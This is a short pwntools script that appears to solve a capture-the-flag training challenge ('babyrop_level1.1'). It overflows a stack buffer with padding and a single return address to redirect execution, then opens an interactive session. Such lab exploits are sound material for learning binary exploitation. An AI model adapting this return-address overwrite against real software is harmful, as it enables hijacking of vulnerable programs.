from pwn import *

p = process('/challenge/babyrop_level1.1')

payload = b'a' * (0x60 + 8) + p64(0x401CAF)

p.sendlineafter(b'\n', payload)

p.interactive()
